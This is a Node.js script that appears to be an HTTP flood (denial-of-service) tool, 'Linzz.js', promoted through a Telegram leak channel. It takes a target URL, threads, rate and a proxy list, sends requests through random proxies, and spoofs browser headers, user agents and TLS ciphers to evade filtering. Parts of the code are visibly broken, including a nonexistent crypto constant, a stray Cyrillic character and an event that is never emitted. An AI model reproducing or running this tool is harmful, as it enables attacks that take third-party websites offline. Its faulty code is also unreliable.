const fs = require('fs');
const http = require('http');
const http2 = require('http2');
const tls = require('tls');
const crypto = require('crypto');
const url = require('url');
const cluster = require('cluster');
const EventEmitter = require('events');

const LintarEmitter = new EventEmitter();

process.setMaxListeners(0);
process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});

const [LintarTarget, LintarTime, LintarThreads, LintarRequests, LintarProxyFile] = process.argv.slice(2);

if (process.argv.length < 5) {
    console.log(`Dont Forget To Join t.me/LeakingCode
Usage: node Linzz.js Host Duration Threads Rate ProxyFiles
Example: node Linzz.js https://example.com 60 8 8 proxies.txt
`);
    process.exit(-1);
}

let LintarErrors = 0;

const LintarProxies = fs.readFileSync(LintarProxyFile, 'utf-8')
    .toString()
    .replace(/\r/g, '')
    .split('\n')
    .filter(word => word.trim().length > 0);

const LintarParsed = url.parse(LintarTarget);

const LintarVersions = [
    '109.0.0.0', '108.0.0.0', '107.0.0.0', '106.0.0.0', '105.0.0.0', '104.0.0.0', 
    '103.0.0.0', '102.0.0.0', '101.0.0.0'
];

const LintarLanguage = [
    'ko-KR', 'en-US', 'zh-CN', 'zh-TW', 'ja-JP', 'en-GB', 'en-AU', 'en-CA', 'en-NZ', 
    'en-ZA', 'en-IN', 'en-PH', 'en-SG', 'en-ZA', 'en-HK', 'en-US', '*', 'en-US,en;q=0.5', 
    'utf-8, iso-8859-1;q=0.5, *;q=0.1', 'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5', 
    'en-GB, en-US, en;q=0.9', 'de-AT, de-DE;q=0.9, en;q=0.5'
];

const LintarVersion = LintarVersions[Math.floor(Math.random() * LintarVersions.length)];

const LintarSigAlgs = [
    'ecdsa_secp256r1_sha256', 'ecdsa_secp384r1_sha384', 'ecdsa_secp521r1_sha512', 
    'rsa_pss_rsae_sha256', 'rsa_pss_rsae_sha384', 'rsa_pss_rsae_sha512', 
    'rsa_pkcs1_sha256', 'rsa_pkcs1_sha384', 'rsa_pkcs1_sha512'
];

const LintarCpList = [
    "ECDHE-ECDSA-AES128-GCM-SHA256", "ECDHE-ECDSA-CHACHA20-POLY1305", 
    "ECDHE-RSA-AES128-GCM-SHA256", "ECDHE-RSA-CHACHA20-POLY1305", 
    "ECDHE-ECDSA-AES256-GCM-SHA384", "ECDHE-RSA-AES256-GCM-SHA384", 
    "ECDHE-ECDSA-AES128-SHA256", "ECDHE-RSA-AES128-SHA256", 
    "ECDHE-ECDSA-AES256-SHA384", "ECDHE-RSA-AES256-SHA384"
];

let LintarSignalsList = LintarSigAlgs.join(':');
let LintarCurve = "GREASE:X25519:x25519";
let LintarOpt = crypto.constants.SSL_OP_NO_RENEGOTIATION | 
                crypto.constants.SSL_OP_NO_TICKET | 
                crypto.constants.SSL_OP_NO_SSLv2 | 
                crypto.constants.SSL_OP_NO_SSLv3 | 
                crypto.constants.SSL_OP_NO_COMPRESSION | 
                crypto.constants.SSL_OP_NO_RENEGOTIATION | 
                crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | 
                crypto.constants.SSL_OP_TLSEXT_PADDING | 
                crypto.constants.SSL_OP_ALL | 
                crypto.constants.SSLcom;

const LintarMethods = ['GET', 'POST']; 

function LintarCipherS() {
   return LintarCpList[Math.floor(Math.random() * LintarCpList.length)];
}

function LintarRandomString(length, type) {
    let string = "";
    let characters = "";
    switch(type) {
        case "LN":
            characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
            break;
        case "L":
            characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
            break;
        case "N":
            characters = "0123456789";
            break;
        default:
            characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
            break;
    }

    for (let i = 0; i < length; i++) {
        string += characters.charAt(Math.floor(Math.random() * characters.length));
    }

    return string;
}

function LintarRandomUserAgent() {
    const userAgents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36',
        'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:91.0) Gecko/20100101 Firefox/91.0',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36'
    ];

    return userAgents[Math.floor(Math.random() * userAgents.length)];
}

function LintarEveryRand() {
    const LintarHeaders = {
        ':authority': LintarParsed.host,
        ':method': LintarMethods[Math.floor(Math.random() * LintarMethods.length)],
        ':path': LintarParsed.path + LintarRandomString(5, "LТ"),
        ':scheme': "https",
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "accept-language": LintarLanguage[Math.floor(Math.random() * LintarLanguage.length)],
        "sec-ch-ua": `"Edg";v="${LintarVersion}", "Edg";v="${LintarVersion}", "Not=A?Brand";v="9"`,
        "sec-ch-ua-mobile": "?" + LintarRandomString(2, "N"), 
        "sec-ch-ua-platform": `"Windows"`,
        "sec-fetch-dest": "document", 
        "sec-fetch-mode": "navigate", 
        "sec-fetch-site": "none", 
        "sec-fetch-user": "?1", 
        "upgrade-insecure-requests": "1", 
        "user-agent": LintarRandomUserAgent(),
        "x-requested-with": "XMLHttpRequest",
        "pragma": "no-cache",
        "cache-control": "no-cache",
        "referer": 'https://' + LintarParsed.host + LintarParsed.path + LintarRandomString(15, "L"),
    };
    return LintarHeaders;
}

function LintarProxyRand() {
    return LintarProxies[Math.floor(Math.random() * LintarProxies.length)];
}

function LintarFlooder() {
    const proxy = LintarProxyRand().split(':');
    const agent = new http.Agent({
        keepAlive: false,
        maxSockets: Infinity,
    });

    const req = http.get({
        method: 'CONNECT',
        host: proxy[0],
        port: proxy[1],
        agent: agent,
        path: LintarParsed.host,
        ciphers: LintarCipherS(),
        timeout: 10000,
        headers: {
            "host": LintarParsed.host,
            "user-agent": LintarRandomUserAgent(), // Menambahkan User-Agent acak pada koneksi proxy
        },
    });

    req.on('connect', (err, info) => {
        if (err) {
            console.log("Proxy connection failed:", err);
            return;
        }

        function LintarAttack(socket) {
            socket.write(
                "GET " + LintarParsed.path + " HTTP/1.1\r\n" +
                "Host: " + LintarParsed.host + "\r\n" +
                "User-Agent: " + LintarRandomUserAgent() + "\r\n" +
                "Connection: keep-alive\r\n" +
                "Upgrade-Insecure-Requests: 1\r\n\r\n"
            );
        }

        LintarAttack(req.socket);
    });
}

for (let i = 0; i < LintarThreads; i++) {
	console.log('Attacked Started | I Love You Guys xD')
    cluster.fork();
}

cluster.on('online', worker => {
    worker.on('message', message => {
        console.log(message);
    });
});

LintarEmitter.on('attack', () => {
    LintarErrors++;
    if (LintarErrors < LintarRequests) {
        LintarFlooder();
    }
});
